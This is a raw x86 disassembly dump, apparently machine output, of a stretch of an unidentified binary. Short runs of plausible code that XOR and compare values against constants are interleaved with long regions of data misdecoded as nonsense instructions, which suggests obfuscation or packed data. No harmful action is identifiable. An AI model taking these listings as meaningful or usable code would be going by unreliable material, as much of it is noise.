  418d77:	push   eax
  418d78:	call   0x422220
  418d7d:	mov    ecx,DWORD PTR [esp+0x50]
  418d81:	mov    ebx,DWORD PTR [esp+0x54]
  418d85:	add    eax,ecx
  418d87:	mov    ecx,DWORD PTR [esp+0x88]
  418d8e:	adc    edx,ebx
  418d90:	jmp    0x418fed
  418d95:	jmp    0x6c98:0xba87068d
  418d9c:	mov    bl,0x37
  418d9e:	cmc    
  418d9f:	mov    esp,0x78a012a4
  418da4:	xchg   edx,eax
  418da5:	inc    esp
  418da6:	sti    
  418da7:	sar    BYTE PTR [esi-0x41413dcb],0xc8
  418dae:	outs   dx,DWORD PTR ds:[esi]
  418daf:	lahf   
  418db0:	fisub  DWORD PTR [eax+0x423668c8]
  418db6:	rcr    DWORD PTR [edx-0x1a],1
  418db9:	push   esi
  418dba:	or     BYTE PTR [ebx-0x1a],ch
  418dbd:	xchg   ebp,eax
  418dbe:	jae    0x418dd8
  418dc0:	or     DWORD PTR [ebp-0x57],eax
  418dc3:	call   0x6bc7:0xcb761daa
  418dca:	push   ds
  418dcb:	push   0xdb1c20ed
  418dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dd1:	cld    
  418dd2:	xchg   DWORD PTR [eax],ebx
  418dd4:	jg     0x418dbc
  418dd6:	dec    ecx
  418dd7:	add    BYTE PTR es:[ecx+edi*1-0x7e],cl
  418ddc:	sub    esp,ecx
  418dde:	or     eax,0x4ed0ff9f
  418de3:	xchg   esi,eax
  418de4:	mov    edx,0x8d550e2
  418de9:	xchg   ebx,eax
  418dea:	xchg   BYTE PTR [ebx-0x6e],bl
  418ded:	jp     0x418e47
  418def:	scas   al,BYTE PTR es:[edi]
  418df0:	lods   al,BYTE PTR ds:[esi]
  418df1:	or     eax,0xecc43cda
  418df6:	sub    esp,DWORD PTR ds:0x3ae1e938
  418dfc:	push   ds
  418dfd:	sbb    eax,0x23104770
  418e02:	cdq    
  418e03:	mov    edi,eax
  418e05:	hlt    
  418e06:	aad    0xf4
  418e08:	test   eax,0xbed6c688
  418e0d:	mov    ebp,0xf0e93080
  418e12:	call   0x95a27411
  418e17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e18:	xor    ebp,DWORD PTR [eax+ebx*2+0x589e32da]
  418e1f:	aad    0x1c
  418e21:	sub    al,0x77
  418e23:	int    0x54
  418e25:	sub    DWORD PTR [ebx],eax
  418e27:	lahf   
  418e28:	icebp  
  418e29:	dec    eax
  418e2a:	push   0x59519c3d
  418e2f:	in     eax,0x24
  418e31:	aas    
  418e32:	sbb    esi,edi
  418e34:	cli    
  418e35:	mov    dl,0x4c
  418e37:	repnz mov dh,0x68
  418e3a:	dec    ebp
  418e3b:	push   eax
  418e3c:	(bad)  
  418e3d:	aas    
  418e3e:	das    
  418e3f:	icebp  
  418e40:	dec    esp
  418e41:	scas   al,BYTE PTR es:[edi]
  418e42:	ficomp WORD PTR [esp+edx*4]
  418e45:	aad    0x6f
  418e47:	repnz fwait
  418e49:	mov    ah,0x45
  418e4b:	leave  
  418e4c:	cs cmc 
  418e4e:	cli    
  418e4f:	sbb    DWORD PTR [ecx-0x249c1317],0x4c
  418e56:	sti    
  418e57:	test   BYTE PTR [ecx-0x307d311b],bl
  418e5d:	push   ds
  418e5e:	pop    ebp
  418e5f:	dec    esi
  418e60:	aaa    
  418e61:	js     0x418e5a
  418e63:	inc    esp
  418e64:	fsubr  st(5),st
  418e66:	xor    al,0x94
  418e68:	and    ah,al
  418e6a:	mov    ah,0x8c
  418e6c:	in     al,dx
  418e6d:	pop    es
  418e6e:	data16 jns 0x418e49
  418e71:	aam    0x36
  418e73:	xchg   edi,eax
  418e74:	sbb    DWORD PTR [edx-0x28edfe9c],0xffffff92
  418e7b:	or     ecx,DWORD PTR [eax-0xa49aa54]
  418e81:	xchg   esp,eax
  418e82:	push   es
  418e83:	loopne 0x418e98
  418e85:	mov    ebp,0x592c57d9
  418e8a:	push   esi
  418e8b:	xor    BYTE PTR [esi+0x68],dl
  418e8e:	cwde   
  418e8f:	push   0x107a15df
  418e94:	jne    0x418ef0
  418e96:	inc    ebp
  418e97:	or     DWORD PTR [edx],ebp
  418e99:	lea    ebx,[esi]
  418e9b:	addr16 cmp dl,0xf5
  418e9f:	aam    0x9e
  418ea1:	fcom   DWORD PTR [ecx-0x55]
  418ea4:	add    eax,0x4311f86
  418ea9:	push   es
  418eaa:	jp     0x418ef0
  418eac:	or     ecx,DWORD PTR gs:[ebp+esi*8+0x0]
  418eb1:	scas   eax,DWORD PTR es:[edi]
  418eb2:	(bad)  [ecx-0x71]
  418eb5:	inc    esp
  418eb6:	and    eax,0x706e3a32
  418ebb:	add    al,0xcb
  418ebd:	pop    esp
  418ebe:	add    eax,0x1e3d867b
  418ec3:	push   cs
  418ec4:	pop    ds
  418ec5:	mov    esi,DWORD PTR [edx+0x7b5d947f]
  418ecb:	fidivr DWORD PTR [ecx+eiz*8-0x2b2f873f]
  418ed2:	sub    edi,DWORD PTR [ebp+0x5a]
  418ed5:	call   0xb863:0x86baab4a
  418edc:	mov    esp,0xc7c477aa
  418ee1:	sub    BYTE PTR [bx],ah
  418ee4:	mov    eax,0xc0b5217f
  418ee9:	adc    DWORD PTR [edx-0x3f5bf679],esi
  418eef:	gs data16 loope 0x418ec3
  418ef3:	sbb    BYTE PTR [ebx],dh
  418ef5:	outs   dx,BYTE PTR ds:[esi]
  418ef6:	xor    dh,bh
  418ef8:	ins    BYTE PTR es:[edi],dx
  418ef9:	rcr    eax,0x74
  418efc:	bound  edx,QWORD PTR ds:0x489513be
  418f02:	(bad)  
  418f03:	fcomip st,st(7)
  418f05:	jg     0x418f1c
  418f07:	mov    ah,0xe8
  418f09:	mov    eax,ds:0xed6e1134
  418f0e:	sar    DWORD PTR [edx+0x7bae309c],0xac
  418f15:	inc    edi
  418f16:	ret    
  418f17:	add    DWORD PTR [edi+0x5af24459],esi
  418f1d:	adc    bh,dh
  418f1f:	sbb    eax,0xf3688ea8
  418f24:	test   al,0xe1
  418f26:	sti    
  418f27:	inc    ebx
  418f28:	fbstp  TBYTE PTR [ecx]
  418f2a:	gs jge 0x418ee9
  418f2d:	loope  0x418f80
  418f2f:	dec    esp
  418f30:	mov    edi,ds
  418f32:	lock sbb eax,0xeb8c461d
  418f38:	add    ecx,DWORD PTR [ebx+0x1b]
  418f3b:	push   ebp
  418f3c:	jnp    0x418fae
  418f3e:	ja     0x418f72
  418f40:	jno    0x418f3a
  418f42:	sbb    DWORD PTR [ecx+0x3e],eax
  418f45:	or     al,0x26
  418f47:	dec    esp
  418f48:	data16 jne 0x418f5f
  418f4b:	jae    0x418ef1
  418f4d:	cmp    eax,0x8ec4644c
  418f52:	loopne 0x418f4d
  418f54:	push   0xffffff89
  418f56:	(bad)
  418f5a:	push   edx
  418f5b:	inc    esi
  418f5c:	popf   
  418f5d:	cwde   
  418f5e:	test   al,0xb4
  418f60:	sub    al,0x67
  418f62:	fbstp  TBYTE PTR [ebp+0x1a7a2070]
  418f68:	sub    BYTE PTR [edi+0x70],ch
  418f6b:	nop
  418f6c:	das    
  418f6d:	jnp    0x418fd6
  418f6f:	pop    ss
  418f70:	cmp    al,0x70
  418f72:	mov    edx,0x3cecede9
  418f77:	sub    BYTE PTR [ebp+ebp*1+0x42],0xf8
  418f7c:	das    
  418f7d:	aad    0x6e
  418f7f:	jecxz  0x418faf
  418f81:	mov    ch,0xe3
  418f83:	jnp    0x418fd9
  418f85:	cmp    ebx,eax
  418f87:	inc    ebp
  418f88:	adc    eax,0x926a7c2c
  418f8d:	adc    esp,DWORD PTR [ebx-0x47da83e7]
  418f93:	ror    ecx,1
  418f95:	sub    dh,bl
  418f97:	sar    DWORD PTR [edx-0x1f],0xc
  418f9b:	push   esi
  418f9c:	xor    al,0x90
  418f9e:	cmp    bh,BYTE PTR [esi-0x63]
  418fa1:	jmp    0x41900c
  418fa3:	mov    WORD PTR [ecx],es
  418fa5:	mov    WORD PTR [ebx-0x49],?
  418fa8:	jle    0x418fcd
  418faa:	sbb    edx,DWORD PTR ds:0x5b5c95f
  418fb0:	loopne 0x418f72
  418fb2:	adc    eax,0xd586d15a
  418fb7:	stos   BYTE PTR es:[edi],al
  418fb8:	adc    DWORD PTR [ebp+0x3f],ebp
  418fbb:	mov    eax,?
  418fbd:	jno    0x418fa9
  418fbf:	dec    ebx
  418fc0:	sahf   
  418fc1:	mov    ah,0x2b
  418fc3:	jb     0x418f80
  418fc5:	(bad)  
  418fc6:	pusha  
  418fc7:	fstp   TBYTE PTR ds:0xfe6eee00
  418fcd:	pop    ss
  418fce:	out    dx,eax
  418fcf:	icebp  
  418fd0:	outs   dx,BYTE PTR ds:[esi]
  418fd1:	dec    ebp
  418fd2:	repnz ror DWORD PTR ds:0x8689a803,0x94
  418fda:	and    DWORD PTR [edi],edi
  418fdc:	add    ah,0x64
  418fdf:	jno    0x419058
  418fe1:	add    ch,BYTE PTR [ecx+0x5303c3e5]
  418fe7:	sub    bh,BYTE PTR [eax-0x31e47c09]
  418fed:	mov    ebx,DWORD PTR [esp+0x8c]
  418ff4:	cmp    ecx,eax
  418ff6:	jne    0x419004
  418ffc:	cmp    ebx,edx
  418ffe:	je     0x41a937
  419004:	mov    eax,DWORD PTR [esp+0x40]
  419008:	mov    edx,DWORD PTR [esp+0x18]
  41900c:	xor    ecx,ecx
  41900e:	shld   ecx,eax,0x2
  419012:	jmp    0x41926f
  419017:	retf   0xad14
  41901a:	repnz mov eax,0x983c8a74
  419020:	xchg   edx,eax
  419021:	xor    bl,ch
  419023:	stos   BYTE PTR es:[edi],al
  419024:	adc    al,BYTE PTR [edx-0x3f004331]
  41902a:	mov    esi,0xbebec235
  41902f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419030:	and    eax,0xc4cac1d5
  419035:	imul   ecx,ecx,0x5e5a5f7c
  41903b:	or     bh,dh
  41903d:	and    edx,edx
  41903f:	pushf  
  419040:	lds    ecx,FWORD PTR [edx-0x2e]
  419043:	cmp    ch,BYTE PTR [esi+0x4a]
  419046:	sti    
  419047:	adc    eax,ebp
  419049:	lea    edi,[edi-0x25]
  41904c:	mov    ebx,0x6c04f4bd
  419051:	ret    0xcad2
  419054:	mov    ecx,0x1d1190e2
  419059:	mov    ds:0x56ee213d,al
  41905e:	lods   eax,DWORD PTR ds:[esi]
  41905f:	sub    BYTE PTR [eax],bh
  419061:	ins    DWORD PTR es:[edi],dx
  419062:	test   al,0x20
  419064:	pop    esi
  419065:	imul   ebx,DWORD PTR [ebp-0x566287a7],0xffffffa5
  41906c:	leave  
  41906d:	test   al,0xae
  41906f:	mov    eax,0x4bd1a2d6
  419074:	mov    eax,0x43d11c87
  419079:	sub    dl,BYTE PTR [edi-0x6e]
  41907c:	or     al,0x7c
  41907e:	mov    WORD PTR [edx+ebp*2],fs
  419081:	pop    cx
  419083:	clc    
  419084:	push   ds
  419085:	test   DWORD PTR [ebp-0x39],edx
  419088:	xchg   ebx,eax
  419089:	cli    
  41908a:	pop    edi
  41908b:	mov    ds:0xb0e9d6e,al
  419090:	xchg   ebp,eax
  419091:	cli    
  419092:	fld    QWORD PTR [ebp-0x45]
  419095:	adc    BYTE PTR [eax+eiz*1],bh
  419098:	leave  
  419099:	call   0xfd6d:0x814677b1
  4190a0:	or     BYTE PTR [edi],bl
  4190a2:	dec    esi
  4190a3:	mov    eax,ds:0xc2cb9ff5
  4190a8:	dec    esp
  4190a9:	out    0xad,al
  4190ab:	les    eax,FWORD PTR [esi+esi*8-0x4a]
  4190af:	fimul  DWORD PTR [eax+ebx*4]
  4190b2:	lods   eax,DWORD PTR ds:[esi]
  4190b3:	jno    0x41905b
  4190b5:	ret    0xc57f
  4190b8:	aas    
  4190b9:	daa    
  4190ba:	imul   ebx,DWORD PTR [edi-0x70],0x619516d8
  4190c1:	pop    es
  4190c2:	or     DWORD PTR [esi-0x7ff990a4],edi
  4190c8:	cwde   
  4190c9:	mov    ah,0x37
  4190cb:	test   DWORD PTR [bx+di+0x7e0d],ebx
  4190d0:	sub    edi,eax
  4190d2:	scas   al,BYTE PTR es:[edi]
  4190d3:	icebp  
  4190d4:	sub    BYTE PTR [esi],bh
  4190d6:	mov    al,fs:0x4edaecca
  4190dc:	and    ebp,DWORD PTR [esi-0x4c]
  4190df:	ret    
  4190e0:	into   
  4190e1:	stc    
  4190e2:	lods   al,BYTE PTR ds:[esi]
  4190e3:	es cmc 
  4190e5:	mov    BYTE PTR [edi+0x3f],al
  4190e8:	nop
  4190e9:	xchg   esp,eax
  4190ea:	mov    esp,0xf052746c
  4190ef:	cmp    ch,BYTE PTR [esi+0x3b]
  4190f2:	into   
  4190f3:	out    dx,eax
  4190f4:	and    BYTE PTR [esi+0x53f84e4a],0x9b
  4190fb:	pop    ds
  4190fc:	(bad)
  419101:	jmp    ebp
  419103:	test   BYTE PTR [edx-0x742002a],bh
  419109:	aad    0x8d
  41910b:	push   cs
  41910c:	sbb    dh,dh
  41910e:	jns    0x41917d
  419110:	daa    
  419111:	adc    bh,BYTE PTR [eax+0x27]
  419114:	fcom   QWORD PTR [ecx]
  419116:	retf   
  419117:	jne    0x41910a
  419119:	loope  0x4190ec
  41911b:	cmp    cl,BYTE PTR [edx-0x5df4c0ac]
  419121:	and    esp,eax
  419123:	out    dx,al
  419124:	cmp    DWORD PTR [ebp-0x13],esi
  419127:	clc    
  419128:	mov    ah,0xe2
  41912a:	cmp    dl,BYTE PTR [edi-0x3b]
  41912d:	fs nop
  41912f:	xchg   edi,eax
  419130:	sbb    al,0xd7
  419132:	std    
  419133:	(bad)  
  419134:	jp     0x4191a2
  419136:	fistp  WORD PTR [ebx+ecx*2]
  419139:	sar    BYTE PTR [ebx-0x70],cl
  41913c:	popf   
  41913d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41913e:	cmc    
  41913f:	push   ecx
  419140:	inc    esi
  419141:	push   esi
  419142:	mov    edx,0x6bff2c57
  419147:	ja     0x41916a
  419149:	push   edi
  41914a:	adc    eax,0xbcd50d00
  41914f:	adc    eax,0xaf0508d8
  419154:	jmp    0x419150
  419156:	push   ebp
  419157:	xchg   DWORD PTR [esi+edx*2+0x4e34cb31],ebp
  41915e:	(bad)  
  41915f:	lods   al,BYTE PTR ds:[esi]
  419160:	mov    eax,0xb8680d02
  419165:	sub    dl,BYTE PTR [ebp-0xec97685]
  41916b:	lods   eax,DWORD PTR ds:[esi]
  41916c:	sbb    al,0xfd
  41916e:	adc    edi,ebx
  419170:	cld    
  419171:	and    bh,cl
  419173:	test   DWORD PTR [eax],edi
  419175:	jns    0x419133
  419177:	sar    BYTE PTR [esi],0x13
  41917a:	jmp    0x41910d
  41917c:	mov    bl,0xcc
  41917e:	add    BYTE PTR [edx-0x56],dh
  419181:	and    bh,BYTE PTR [edi+ebp*4+0x2cf4fc61]
  419188:	dec    edx
  419189:	inc    eax
  41918a:	aam    0x9a
  41918c:	dec    edx
  41918d:	sbb    eax,0xbd143b88
  419192:	mov    ebx,0x82c27250
  419197:	fist   WORD PTR [esi+ebp*1-0x27]
  41919b:	lock nop
  41919d:	pop    ss
  41919e:	adc    al,0x5c
  4191a0:	pushf  
  4191a1:	scas   eax,DWORD PTR es:[edi]
  4191a2:	cdq    
  4191a3:	pop    ecx
  4191a4:	daa    
  4191a5:	dec    esp
  4191a6:	mov    dl,0x0
  4191a8:	mov    esp,0xd217faad
  4191ad:	cld    
  4191ae:	in     al,0xe1
  4191b0:	fs cwde 
  4191b2:	sub    bh,BYTE PTR [esi+eax*1-0x80]
  4191b6:	je     0x419210
  4191b8:	(bad)  
  4191b9:	retf   
  4191ba:	sub    edx,DWORD PTR [eax-0x50]
  4191bd:	pusha  
  4191be:	mov    ds:0x54b143d5,eax
  4191c3:	icebp  
  4191c4:	shl    BYTE PTR [ecx*4+0x7b199976],1
  4191cb:	xor    eax,0x4e36bd4e
  4191d0:	mov    ds,WORD PTR fs:[eax+0x3b]
  4191d4:	mov    al,0xc3
  4191d6:	add    esi,esi
  4191d8:	ins    DWORD PTR es:[edi],dx
  4191d9:	aaa    
  4191da:	das    
  4191db:	pop    esi
  4191dc:	fcmovnu st,st(6)
  4191de:	push   cs
  4191df:	call   0x92658ee8
  4191e4:	cli    
  4191e5:	in     al,0x52
  4191e7:	(bad)  
  4191e8:	in     al,dx
  4191e9:	fst    QWORD PTR [esi-0x2db2da9b]
  4191ef:	fisttp WORD PTR cs:[esi+0x6463e8a]
  4191f6:	mov    ah,0xf6
  4191f8:	jns    0xfe2dfc84
  4191fe:	mov    bl,0x19
  419200:	sub    ah,BYTE PTR [edi-0x33]
  419203:	repnz scas al,BYTE PTR es:[edi]
  419205:	mov    dl,ah
  419207:	jae    0x4191f1
  419209:	sub    dl,BYTE PTR [ecx+0x64066de]
  41920f:	jp     0x41927b
  419211:	rol    DWORD PTR [ecx],cl
  419213:	mov    ebp,DWORD PTR [edx-0x42]
  419216:	ret    0xef4a
  419219:	jne    0x4191fc
  41921b:	push   ebp
  41921c:	sahf   
  41921d:	(bad)  [ebx-0x1e9250c2]
  419223:	mov    BYTE PTR [ecx-0x542890be],cl
  419229:	clc    
  41922a:	arpl   bp,sp
  41922c:	fcmovnb st,st(0)
  41922e:	(bad)  
  41922f:	ins    BYTE PTR es:[edi],dx
  419230:	cmp    dh,dh
  419232:	pop    edx
  419233:	sub    edi,DWORD PTR [esp+ebx*8-0x2b]
  419237:	outs   dx,DWORD PTR ds:[esi]
  419238:	repnz adc ebx,esp
  41923b:	mov    DWORD PTR [edi],esi
  41923d:	stc    
  41923e:	mov    esp,0xb9c2b2af
  419243:	mov    dl,0x3
  419245:	push   ss
  419246:	mov    esi,0x9655bc11
  41924b:	rcl    DWORD PTR [edx],0x1
  41924e:	nop
  41924f:	push   edx
  419250:	jl     0x419234
  419252:	pop    esp
  419253:	stos   BYTE PTR es:[edi],al
  419254:	fnstsw WORD PTR [ecx+0x24]
  419257:	int    0xda
  419259:	adc    eax,0x77b3b372
  41925e:	stos   BYTE PTR es:[edi],al
  41925f:	inc    eax
  419260:	jmp    0x419260
  419262:	jae    0x41925c
  419264:	push   esp
  419265:	dec    edx
  419266:	pop    eax
  419267:	jge    0x419222
  419269:	cmp    eax,0x30f7b0c6
  41926e:	push   edi
  41926f:	shl    eax,0x2
  419272:	mov    ebx,0xcb79b576
  419277:	mov    DWORD PTR [esp+0x10],edx
  41927b:	mov    edx,DWORD PTR [esp+0x1c]
  41927f:	xor    eax,ebx
  419281:	xor    ecx,esi
  419283:	mov    DWORD PTR [esp+0x14],edx
  419287:	cmp    eax,DWORD PTR [esp+0x10]
  41928b:	jne    0x419299
  419291:	cmp    ecx,edx
  419293:	je     0x41a93c
  419299:	mov    eax,DWORD PTR [esp+0x44]
  41929d:	cmp    eax,0xa5069baa
  4192a2:	je     0x4192f6
  4192a8:	mov    edx,DWORD PTR [esp+0x18]
  4192ac:	mov    eax,DWORD PTR [esp+0x1c]
  4192b0:	xor    eax,esi
  4192b2:	xor    edx,0xcb79b577
  4192b8:	shrd   edx,eax,0x2
  4192bc:	shr    eax,0x2
  4192bf:	mov    DWORD PTR [esp+0x34],eax
  4192c3:	mov    eax,DWORD PTR [esp+0x18]
  4192c7:	mov    ecx,DWORD PTR [esp+0x1c]
  4192cb:	shl    eax,0x1e
  4192ce:	xor    eax,0x80000000
  4192d3:	or     eax,DWORD PTR [esp+0x34]
  4192d7:	xor    ecx,ecx
  4192d9:	mov    DWORD PTR [esp+0x14],eax
  4192dd:	mov    eax,DWORD PTR [esp+0x60]
  4192e1:	or     ecx,edx
  4192e3:	cdq    
  4192e4:	cmp    ecx,eax
  4192e6:	jne    0x41a93c
  4192ec:	cmp    DWORD PTR [esp+0x14],edx
  4192f0:	jne    0x41a93c
  4192f6:	mov    DWORD PTR [esp+0x5c],0x422744
  4192fe:	mov    DWORD PTR [esp+0x68],0x42273c
  419306:	mov    eax,DWORD PTR [esp+0x78]
  41930a:	mov    eax,DWORD PTR [esp+0x78]
  41930e:	mov    edx,DWORD PTR [esp+0x18]
  419312:	xor    ecx,ecx
  419314:	shld   ecx,eax,0x2
  419318:	shl    eax,0x2
  41931b:	mov    DWORD PTR [esp+0x10],edx
  41931f:	mov    edx,DWORD PTR [esp+0x1c]
  419323:	xor    eax,ebx
  419325:	xor    ecx,esi
  419327:	mov    DWORD PTR [esp+0x14],edx
  41932b:	cmp    DWORD PTR [esp+0x10],eax
  41932f:	jne    0x41a5e3
  419335:	cmp    edx,ecx
  419337:	jne    0x41a5e3
  41933d:	mov    DWORD PTR [esp+0x30],0x4226cc
  419345:	mov    eax,DWORD PTR [esp+0x18]
  419349:	mov    ecx,DWORD PTR [esp+0x1c]
  41934d:	shrd   eax,ecx,0x2
  419351:	shr    ecx,0x2
  419354:	mov    ecx,DWORD PTR [esp+0x18]
  419358:	mov    edx,DWORD PTR [esp+0x1c]
  41935c:	mov    edx,DWORD PTR [esp+0x30]
  419360:	mov    edx,DWORD PTR [edx+0xc]
  419363:	mov    DWORD PTR [esp+0xc],eax
  419367:	shl    ecx,0x1e
  41936a:	mov    eax,0x32de6d5d
  41936f:	xor    DWORD PTR [esp+0xc],eax
  419373:	xor    ecx,ecx
  419375:	or     ecx,DWORD PTR [esp+0xc]
  419379:	cmp    ecx,DWORD PTR [edx]
  41937b:	jne    0x41a320
  419381:	mov    ecx,0x65c7
  419386:	mov    WORD PTR [esp+0x2c],cx
  41938b:	mov    ecx,0x6062
  419390:	mov    WORD PTR [esp+0x24],cx
  419395:	mov    ecx,0x125d
  41939a:	mov    WORD PTR [esp+0xc],cx
  41939f:	movzx  ecx,WORD PTR [esp+0xc]
  4193a4:	mov    edx,0x2d0f
  4193a9:	and    cx,dx
  4193ac:	mov    dx,WORD PTR [esp+0x24]
  4193b1:	or     cx,dx
  4193b4:	mov    dx,WORD PTR [esp+0x2c]
  4193b9:	add    cx,dx
  4193bc:	or     ecx,0x3b22
  4193c2:	mov    WORD PTR [esp+0x3c],cx
  4193c7:	mov    ecx,0x57d4
  4193cc:	mov    WORD PTR [esp+0x2c],cx
  4193d1:	mov    ecx,0x3b21
  4193d6:	mov    WORD PTR [esp+0x38],cx
  4193db:	mov    ecx,0x52fd
  4193e0:	mov    WORD PTR [esp+0x24],cx
  4193e5:	mov    ecx,0x2ce0
  4193ea:	mov    WORD PTR [esp+0xc],cx
  4193ef:	mov    cx,WORD PTR [esp+0xc]
  4193f4:	mov    dx,WORD PTR [esp+0x24]
  4193f9:	jmp    0x419656
  4193fe:	gs pop ss
  419400:	dec    BYTE PTR [eax+esi*4]
  419403:	sbb    al,0x6b
  419405:	mov    esp,0xd16889ea
  41940a:	inc    ebx
  41940b:	pop    ebx
  41940c:	bound  ebx,QWORD PTR [esi-0x413ffacd]
  419412:	xor    eax,0xbebec2
  419417:	add    bl,BYTE PTR [ebx-0x77]
  41941a:	add    edx,DWORD PTR [esi+0x28]
  41941d:	mov    ebp,0xaf3e1b92
  419422:	scas   eax,DWORD PTR es:[edi]
  419423:	stc    
  419424:	sbb    edx,ecx
  419426:	std    
  419427:	outs   dx,DWORD PTR ds:[esi]
  419428:	xchg   ecx,eax
  419429:	mov    esi,DWORD PTR [edx]
  41942b:	aaa    
  41942c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41942d:	xchg   ebx,eax
  41942e:	loope  0x4193e6
  419430:	pop    ss
  419431:	xchg   ebp,eax
  419432:	push   0xee246cdc
  419437:	mov    cl,0x48
  419439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41943a:	jmp    0x9bb2:0x11984aa
  419441:	cwde   
  419442:	jbe    0x41945c
  419444:	cmp    cl,BYTE PTR [ecx]
  419446:	lods   al,BYTE PTR ds:[esi]
  419447:	sti    
  419448:	aaa    
  419449:	push   edx
  41944a:	cli    
  41944b:	push   0x7
  41944d:	fbstp  TBYTE PTR [ecx+0x3b54a55c]
  419453:	jp     0x419407
  419455:	(bad)  
  419456:	mul    ecx
  419458:	stc    
  419459:	add    BYTE PTR [ebx],ch
  41945b:	mov    WORD PTR [edi+0x12],gs
  41945e:	daa    
  41945f:	repz mov edi,0xefd34c46
  419465:	out    0x80,al
  419467:	shr    BYTE PTR [edx+0x8],1
  41946a:	mov    ds:0x39ab9c29,eax
  41946f:	rcr    DWORD PTR [ecx],cl
  419471:	mov    ah,0x35
  419473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419474:	mov    DWORD PTR [edi+0x2b90e989],ebp
  41947a:	or     ah,BYTE PTR [ebp-0x5]
  41947d:	sub    ecx,DWORD PTR es:[edx-0x1]
  419481:	xor    al,bh
  419483:	add    edi,ebp
  419485:	sbb    al,0x34
  419487:	inc    esi
  419488:	das    
  419489:	sahf   
  41948a:	div    DWORD PTR [edi+0x63]
  41948d:	dec    ebp
  41948e:	dec    esi
  41948f:	aas    
  419490:	push   es
  419491:	in     eax,0x9
  419493:	mov    eax,0x7d81d0f
  419498:	outs   dx,DWORD PTR ds:[esi]
  419499:	pop    es
  41949a:	sub    al,dl
  41949c:	cld    
  41949d:	xchg   DWORD PTR [ebp-0x73],ebp
  4194a0:	dec    esi
  4194a1:	jmp    0x44be648b
  4194a6:	adc    DWORD PTR [edx+0x2baa6c95],esp
  4194ac:	xor    edx,ecx
  4194ae:	pop    ebx
  4194af:	cmp    BYTE PTR [ebp+eiz*8+0x72c296b7],0x5
  4194b7:	or     eax,0x7a4d4ec1
  4194bc:	or     ebp,DWORD PTR [ebx-0x246492ec]
  4194c2:	mov    dl,BYTE PTR [edi+0x832d294]
  4194c8:	and    dh,BYTE PTR [esp+eax*1+0x75]
  4194cc:	and    dl,BYTE PTR [eax-0x28]
  4194cf:	mov    eax,0xaefc2d
  4194d4:	or     DWORD PTR [ebx+0x3c],ebx
  4194d7:	add    DWORD PTR [esi+0x4c11fed8],0x73
  4194de:	ret    0x15fc
  4194e1:	addr16 fwait
  4194e3:	sahf   
  4194e4:	dec    ebx
  4194e5:	(bad)  
  4194e6:	pop    esi
  4194e7:	inc    eax
  4194e8:	xchg   DWORD PTR [ebx+0x4c],edx
  4194eb:	push   ebx
  4194ec:	icebp  
  4194ed:	mov    ah,0x28
  4194ef:	cmp    DWORD PTR [edx],ecx
  4194f1:	or     bh,BYTE PTR [edi]
  4194f3:	and    al,0xec
  4194f5:	inc    ebp
  4194f6:	dec    eax
  4194f7:	jg     0x41953b
  4194f9:	ret    0xd067
  4194fc:	mov    bh,cl
  4194fe:	out    0x7f,eax
  419500:	inc    edi
  419501:	(bad)  
  419502:	mov    eax,0xd0bf42a0
  419507:	jae    0x41957b
  419509:	stos   DWORD PTR es:[edi],eax
  41950a:	push   0x2b027ec4
  41950f:	fist   DWORD PTR [esi+0x2300df46]
  419515:	sbb    al,0x7d
  419517:	xor    ebx,DWORD PTR [edx-0x43234d10]
  41951d:	inc    esp
  41951e:	push   edx
  41951f:	cmp    DWORD PTR es:[edx+0x1132056],eax
  419526:	stos   DWORD PTR es:[edi],eax
  419527:	sub    eax,0x80ef3a76
  41952c:	push   esp
  41952d:	or     ebx,esp
  41952f:	xor    eax,0x4a55d5df
  419534:	mov    BYTE PTR [ebx+0x3eeaae2c],cl
  41953a:	lahf   
  41953b:	mov    WORD PTR [ebp-0x268176e3],cs
  419541:	cmp    eax,DWORD PTR [edx+0x2c664be6]
  419547:	je     0x419564
  419549:	push   esi
  41954a:	jle    0x419584
  41954c:	out    0x82,eax
  41954e:	xor    edx,DWORD PTR [edx-0x35]
  419551:	pop    esp
  419552:	xchg   edx,eax
  419553:	bound  ecx,QWORD PTR [ebp+0x71]
  419556:	pusha  
  419557:	hlt    
  419558:	xor    ebx,DWORD PTR fs:[ebx-0xc]
  41955c:	sub    ah,BYTE PTR [eax]
  41955e:	or     esp,0xbd32f3b4
  419564:	fsubr  QWORD PTR [esi-0x11e28700]
  41956a:	cwde   
  41956b:	sub    dh,dl
  41956d:	and    BYTE PTR [eax],0x83
  419570:	mov    ds:0xf8b6ec7e,al
  419575:	std    
  419576:	loopne 0x419570
  419578:	popf   
  419579:	pop    esp
  41957a:	xor    DWORD PTR [ecx+0x6594baa8],ebx
  419580:	mov    ch,0xfd
  419582:	mov    ds:0x368c27eb,eax
  419587:	push   0x77d215f5
  41958c:	or     ch,BYTE PTR [ebx+edi*8-0x4a6fc416]
  419593:	mov    ds:0x87962427,eax
  419598:	push   es
  419599:	dec    edi
  41959a:	cmc    
  41959b:	pop    ecx
  41959c:	inc    ebp
  41959d:	or     DWORD PTR [ecx-0x76],ebx
  4195a0:	push   esi
  4195a1:	and    eax,0x552b66df
  4195a6:	or     ebx,ebp
  4195a8:	adc    BYTE PTR [edx+0xad17ed5],bl
  4195ae:	pop    eax
  4195af:	add    esi,ebx
  4195b1:	xor    BYTE PTR [ecx-0x6a],dh
  4195b4:	inc    ebx
  4195b5:	add    al,0x52
  4195b7:	(bad)  
  4195b8:	into   
  4195b9:	add    bl,cl
  4195bb:	cld    
  4195bc:	data16 stc 
  4195be:	sti    
  4195bf:	(bad)  [edi-0x6ce12835]
  4195c5:	cmp    BYTE PTR ds:0x77714487,bh
  4195cb:	ds xor edx,ebp
  4195ce:	test   BYTE PTR [ecx-0x41b8c265],0x64
  4195d5:	test   esi,ebp
  4195d7:	xchg   esp,eax
  4195d8:	fcomi  st,st(2)
  4195da:	popf   
  4195db:	xchg   ecx,eax
  4195dc:	sub    BYTE PTR [edx-0x21084be8],dl
  4195e2:	int3   
  4195e3:	mov    esi,gs
  4195e5:	jmp    0xd83dc9a9
  4195ea:	scas   al,BYTE PTR es:[edi]
  4195eb:	xchg   ecx,eax
  4195ec:	push   0x29f60869
  4195f1:	jns    0x419636
